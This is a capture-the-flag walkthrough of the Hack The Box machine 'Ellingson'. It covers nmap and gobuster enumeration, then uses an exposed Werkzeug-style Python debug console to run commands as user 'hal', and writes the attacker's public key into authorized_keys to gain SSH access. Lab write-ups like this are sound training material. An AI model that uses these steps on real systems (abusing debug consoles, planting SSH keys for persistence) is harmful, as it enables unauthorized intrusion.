<center><h1>Ellingson</h1></center>
<br>
<center><h3>Summary</h3></center>

First start with an Nmap scan

```
# Nmap 7.70 scan initiated Sat Jun 15 12:15:32 2019 as: nmap -sV -sC -T4 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.042s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 15 12:15:45 2019 -- 1 IP address (1 host up) scanned in 13.05 seconds
```
Only a couple ports open but I will be looking at port 80 specifically. Navigating to the web page I am greeted with a simple website.

<center><img src="/htb/ellingson/home/png"></center>
<br>
Doing some manual enumeration reveals a post written by <b>The Plague</b> mentioning some of the most common passwords. If you don't recognize this quote it is from the movie <b>hackers</b>

<center><img src="/htb/ellingson/quote.png"></center>
<br>
Next step was to run a <b>gobuster</b>.
```
# gobuster dir -u http://10.10.10.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.139
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/24 16:39:02 Starting gobuster
===============================================================
/index (Status: 200)
/images (Status: 301)
/assets (Status: 301)
```
So there are a few directories but nothing we didn't find with the manual enumeration. Something I did notice is that the <b>/articles</b> directory was not there even though the web page has an <b>/articles</b> directory. This gave me the idea to look closer at that directory to see if I could find anything manually. Turns out that if you enter an article number higher than 3 then it gives you the option to use a python interactive console.

<center><img src="/htb/ellingson/debug.png"></center>
<br>
I can check what user I am by using the <b>getpass</b> module
```
>>> import getpass; getpass.getuser()
'hal'
```
Listing the different users I can see that there are 4 different users
```
>>> import os; os.listdir("/home/")
['margo', 'duke', 'hal', 'theplague']
```
I try to list the contents of the other users home directory but I get a <b>permission denied</b> message. If I list the contents of <b>hal</b> home directory I do see the <b>.ssh</b> folder where I will add my public ssh key so I would be able to SSH into the box. I actually had a problem where I had to delete the old <b>authorized_keys</b> file and create a new one for this to work.
```
>>> import os; os.listdir("/home/hal")
['.profile', '.bashrc', '.ssh', '.gnupg', '.bash_logout', '.viminfo', '.cache']

>>> import os; os.remove("authorized_keys")

>>> f = open("authorized_keys", "x")

>>> file = open('/home/hal/.ssh/authorized_keys', 'a+'); file.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBUPV7FTCebGM8cVPLNAXafVzGxdKWapX8HWSQ6GrzSBCMzB3sFt7yJEeWBGGVOnXM7dz0hpXkyRJ7dU+qhuOApYK2oW8hZmPLHK9+/9+kdFWUQdi/yIMnHuwU/ol2g1k68IrEMv5SgYZayn5+lC6vNng8+Jbs3hAsA0yLcurz86HwJlCOYNJi6cWTaULrTfuwxeWGRIClCUOxct2AJ64jfIAHZJLO0EkRSZZdNxV/dOeQT5WzZYnW9ExEroFpjzyBOkLdTcUNolA2xkTR2tO0YMwJMBGwirbBL4gf0Ibrm4aQ9Cfz0T56zm9YC9eeP82kZS86N6991hbD7LZR7jv4r6SK9hqEYOAhbE5n2ytPAEb6XF7y1ps6PrbwuVaJAustme41oCYafeDjmEjXIO8t6SUIA9HI+WoBp6K4YLI7zKVMWi5Ij705fjHTqEraDw27c3RZhhpJ0Z9zGeMSjG8wD+QvGjIlkMc+5/AAh1KP6EiCoyv5SK0iFjQ2hF7byoM= root@kali"); file.close()
```
Now I am able to SSH in using my public key
```
# ssh -i id_rsa.pub hal@10.10.10.139
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 24 17:31:09 UTC 2019

  System load:  0.08               Processes:            98
  Usage of /:   23.7% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.


Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$
```
